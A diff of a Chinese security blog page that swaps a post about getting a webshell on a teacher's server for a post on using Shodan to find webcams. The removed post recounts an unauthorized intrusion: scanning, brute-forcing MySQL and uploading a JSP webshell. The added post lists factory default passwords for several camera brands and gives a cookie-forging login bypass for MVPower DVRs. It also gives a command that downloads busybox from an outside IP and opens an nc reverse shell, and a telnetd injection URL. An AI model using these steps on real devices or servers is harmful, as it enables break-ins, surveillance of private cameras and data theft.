@@ -10,7 +10,7 @@
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="theme-color" content=#58b77a>
-  <title>记一次拿webshell的过程 | lcs</title>
+  <title>shodan的基础使用以及一次摄像头渗透 | lcs</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="author" content="低谷时读书">
   <meta name="keywords" content="">
@@ -84,8 +84,8 @@
   <div class="overlay">
   <div class="page-title">
     <div class="avatar"><a href="/"><img src="/images/avatar.jpeg"></a></div>
-    <span>2020-06-05</span>
-    <h2>记一次拿webshell...</h2>
+    <span>2020-08-12</span>
+    <h2>shodan的基础使用以...</h2>
     <div class="tags"><i class="fa fa-tag"></i><a class="tag-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></div>
     <div class="social-links">
     <a href="https://github.com/crockme" target="_blank"><i class="fa fa-github fa-fw"></i></a>
@@ -98,10 +98,41 @@
   <div class="lx-post">
     <div class="lx-entry padding">
       <div>
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在临近毕业答辩之际，答辩老师为了确定答辩顺序，在qq群里发了个随机抽签的链接。点进去发现，这个小网页应该是临时部署上去的，她的8080端口还部署有一个完整的系统。于是准备拿这个网站下手学习一下。</p>
-<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>扫扫更健康<br>先用御剑扫描web目录<img src="/images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8B%BFwebshell%E7%9A%84%E8%BF%87%E7%A8%8B/001.jpg" alt=""><br>再用Nmap扫描查看open状态 <img src="/images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8B%BFwebshell%E7%9A%84%E8%BF%87%E7%A8%8B/002.jpg" alt=""></p>
-<h2 id="开始整"><a href="#开始整" class="headerlink" title="开始整"></a>开始整</h2><p>21看ftp文件 22爆破ssh<br>80 8080 Web服务 手工看功能点 注入点 上传点 输入点<br>经过ssh弱口令简单尝试后无果，查看其登录注册功能，发现注册的邮箱验证码功能是假的，点了几次都没有收到验证码，开始陷入怀疑和沉思中。<br>点进登录页面，发现忘记密码功能可用，链接为另一台服务器。惊了，难道还是分布式部署。于是重新进行以上流程，发现3306端口MySQL开放，正所谓柳暗花明又一村。<br>发现8080端口存在tomcat默认页面，tomcat默认页面也可攻击。<br>爆破MySQL密码，成功拿到密码。连上去，查表回到Web后台，或直接写shell。有几个mysql下getshell的方法<a href="http://sh1yan.top/2018/05/26/mysql-writ-shell/" target="_blank" rel="noopener">http://sh1yan.top/2018/05/26/mysql-writ-shell/</a><br>这里先用管理员账号登录进去，看看有什么好东西。<br>这种存在参数?xx=xx的可能存在SQL注入(GET型)<img src="/images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8B%BFwebshell%E7%9A%84%E8%BF%87%E7%A8%8B/003.jpg" alt=""><br>存在表单、涉及到和数据库查询操作的，可能存在POST型注入。<br>而后发现网站会员具有上传文件的功能（上传证件照片等待管理员审核），测试后发现并没有文件拓展名检测，直接上传jsp小马。<img src="/images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8B%BFwebshell%E7%9A%84%E8%BF%87%E7%A8%8B/004.jpg" alt="">随后需要找到jsp的路径。上传后会员无法查看自己上传的文件，于是登录管理员账号查看。<br>上传后会员无法查看自己上传的文件，于是登录管理员账号查看。成功getshell。<img src="/images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8B%BFwebshell%E7%9A%84%E8%BF%87%E7%A8%8B/005.jpg" alt=""></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经过这次渗透测试我熟悉了基本的渗透流程，由于方向较多，并没有深挖，应该还有不同的getshell的方法，还有很多可以学习的地方。<br>最后感谢一位不愿意透露姓名的好友</p>
+        <h2 id="什么是shodan"><a href="#什么是shodan" class="headerlink" title="什么是shodan"></a>什么是shodan</h2><p>首先，Shodan 是一个搜索引擎，但它与 Google 这种搜索网址的搜索引擎不同，Shodan 是用来搜索网络空间中在线设备的，你可以通过 Shodan 搜索指定的设备，或者搜索特定类型的设备，其中 Shodan 上最受欢迎的搜索内容是：webcam，linksys，cisco，netgear，SCADA等等。<br>那么 Shodan 是怎么工作的呢？Shodan 通过扫描全网设备并抓取解析各个设备返回的 banner 信息，通过了解这些信息 Shodan 就能得知网络中哪一种 Web 服务器是最受欢迎的，或是网络中到底存在多少可匿名登录的 FTP 服务器。</p>
+<h2 id="Shodan一些常用的语法"><a href="#Shodan一些常用的语法" class="headerlink" title="Shodan一些常用的语法"></a>Shodan一些常用的语法</h2><p>hostname：搜索指定的主机或域名。例如，hostname:”google”<br>port：搜索指定的端口或服务。例如， port:”21”<br>country：搜索指定的国家。例如， country:”CN”<br>city：搜索指定的城市。例如，city:”Hefei”<br>org：搜索指定的组织或公司。例如，org:”google”<br>isp：搜索指定的ISP供应商。例如， isp:”China Telecom”<br>product：搜索指定的操作系统/软件/平台。例如， product:”Apache httpd”<br>version：搜索指定的软件版本。例如， version:”1.6.2”<br>geo：搜索指定的地理位置，参数为经纬度。例如， geo:”31.8639,117.2808”<br>before/after：搜索指定收录时间前后的数据，格式为 dd-mm-yy。例如， before:”11-09-19”<br>net：搜索指定的IP地址或子网。例如，net:”210.45.240.0/24”</p>
+<h2 id="shodan搜索例子"><a href="#shodan搜索例子" class="headerlink" title="shodan搜索例子"></a>shodan搜索例子</h2><p>1、查找位于合肥的Apache服务器<br>apache city:”Hefei”<br>2、查找位于国内的Nginx服务器<br>nginx country:”CN”<br>3、查找GWS（Gogle Web Server）服务器<br>server: gws hostname:”google”<br>4、查找指定网段华为设备<br>huawei net:”64.191.146.0/24”<br>Shodan怎样搜索摄像头?<br>shodan搜索网络摄像头也很简单，只要你知道这个摄像头是什么品牌？叫什么？它的Server服务名称是什么就可以了，以下给大家举两个简单的例子：<br>5、查找国内的 海康威视网络摄像头<br>Server: Hikvision-Webs country:”CN”<br>6、查找SQ-WEBCAM摄像头<br>Server: SQ-WEBCAM</p>
+<h2 id="网络摄像头存在漏洞分析"><a href="#网络摄像头存在漏洞分析" class="headerlink" title="网络摄像头存在漏洞分析"></a>网络摄像头存在漏洞分析</h2><h4 id="1-存在弱口令漏洞"><a href="#1-存在弱口令漏洞" class="headerlink" title="1.存在弱口令漏洞"></a>1.存在弱口令漏洞</h4><p>   简称为“CCTV”（Mvpower 8 Channel Security DVR Full D1 H.264CCTV Real-time Network Digital Video Recorder Mobile Motion Detection,P2P HDMIAlarm Email for CCTV Surveillance Cmeras System）amazon购买地址<a href="http://www.amazon.co.uk/dp/B0162AQCO4，存在弱口令admin密码为空。收集的其它几款网络摄像机的口令如下：" target="_blank" rel="noopener">http://www.amazon.co.uk/dp/B0162AQCO4，存在弱口令admin密码为空。收集的其它几款网络摄像机的口令如下：</a><br> （1）海康威视IP网络摄像机：超级用户：admin，超级用户密码：12345。<br> （2）大华网络摄像机：用户名：admin，密码：888888。<br> （3）天地伟业网络摄像机：用户名：Admin，密码：111111</p>
+<h4 id="2-登录密码绕过漏洞"><a href="#2-登录密码绕过漏洞" class="headerlink" title="2.登录密码绕过漏洞"></a>2.登录密码绕过漏洞</h4><p>   我们可以对之前用默认密码成功登录的页面进行抓包，找到处理页面登录逻辑的js，对处理页面登录的逻辑分析发现，存在登录绕过漏洞，代码如下：<br>$(document).ready(function(){</p>
+<pre><code>dvr_camcnt= Cookies.get(&quot;dvr_camcnt&quot;);
+
+iSetAble= Cookies.get(&quot;iSetAble&quot;);
+
+iPlayBack= Cookies.get(&quot;iPlayBack&quot;);
+
+dvr_usr= Cookies.get(&quot;dvr_usr&quot;);
+
+dvr_pwd= Cookies.get(&quot;dvr_pwd&quot;);
+
+if(iSetAble== &apos;0&apos;){
+
+        $(&apos;#pb_settings&apos;).css(&apos;display&apos;,&apos;none&apos;);
+
+        }
+
+if(iPlayBack== &apos;0&apos;){
+
+        $(&apos;#pb_review&apos;).css(&apos;display&apos;,&apos;none&apos;);
+
+        }
+
+if(dvr_camcnt== null || dvr_usr == null || dvr_pwd == null)
+
+{
+
+        location.href= &quot;/index.html&quot;;
+
+}</code></pre><p>   系统管理页面直接通过js检查cookie是否为空来判断用户是否登录。现在竟然还有程序员这样来写登录状态判断。<br>   于是，通过伪造cookie便可以绕过登录检查。通过代码可以看到需要伪造三个cookie值，dvr_camcnt，dvr_usr=admin，dvr_pwd=123。直接打开<a href="http://xx.xx.xx.xx/view2.html时，抓包发现系统会自动设置该cookie参数的值，这个值需要记录下来，否则后面填错的话是看不到监控内容的。dvr_usr和dvr_pwd可以随便设置，只要不为空就好，如图1所示。保存后，重新刷新一下http://xx.xx.xx.xx/view2.html，便可以成功登录系统。" target="_blank" rel="noopener">http://xx.xx.xx.xx/view2.html时，抓包发现系统会自动设置该cookie参数的值，这个值需要记录下来，否则后面填错的话是看不到监控内容的。dvr_usr和dvr_pwd可以随便设置，只要不为空就好，如图1所示。保存后，重新刷新一下http://xx.xx.xx.xx/view2.html，便可以成功登录系统。</a></p>
+<h4 id="3-获取反弹shell"><a href="#3-获取反弹shell" class="headerlink" title="3.获取反弹shell"></a>3.获取反弹shell</h4><p>执行以下命令：<br>cd/root/rec/a1 &amp;&amp; wget <a href="http://212.111.43.161/busybox" target="_blank" rel="noopener">http://212.111.43.161/busybox</a> &amp;&amp;chmod +xbusybox&amp;&amp; ./busybox  nc 122.115.47.398000 -e /bin/sh -e /bin/sh，将反弹shell至122.115.47.39的8000端口。还可以执行命令“<a href="http://www.antian365.com/shell?/usr/sbin/telnetd-l/bin/sh" target="_blank" rel="noopener">http://www.antian365.com/shell?/usr/sbin/telnetd-l/bin/sh</a> -p 25”通过telnet 目标IP直接进入系统。</p>
 
       </div>
     </div>
@@ -110,12 +141,12 @@
 <div class="lx-navigation">
 	<div class="lx-cover prev lx-cover-sm" style="background-image: url(//cdn.jsdelivr.net/npm/theme-lx@0.3.9/source/images/footer-l.jpeg)">
 		<div class="overlay"></div>
-		<a class="copy" href="/2020/06/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%91%84%E5%83%8F%E5%A4%B4%E6%B8%97%E9%80%8F/">
+		<a class="copy" href="#">
 			<div class="display-t">
 				<div class="display-tc">
 					<div>
 						<span>Next</span>
-						<h3>记一次摄像头渗透</h3>
+						<h3>No newer post</h3>
 					</div>
 				</div>
 			</div>
@@ -123,12 +154,12 @@
 	</div>
         <div class="lx-cover next lx-cover-sm" style="background-image: url(//cdn.jsdelivr.net/npm/theme-lx@0.3.9/source/images/footer-r.jpeg)">
 		<div class="overlay"></div>
-		<a class="copy" href="/2020/04/21/%E9%A2%84%E7%BC%96%E8%AF%91%E7%90%86%E8%A7%A3/">
+		<a class="copy" href="/2020/06/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%91%84%E5%83%8F%E5%A4%B4%E6%B8%97%E9%80%8F/">
 			<div class="display-t">
 				<div class="display-tc">
 					<div>
 						<span>Prev</span>
-						<h3>Mybatis...</h3>
+						<h3>记一次摄像头渗透</h3>
 					</div>
 				</div>
 			</div>
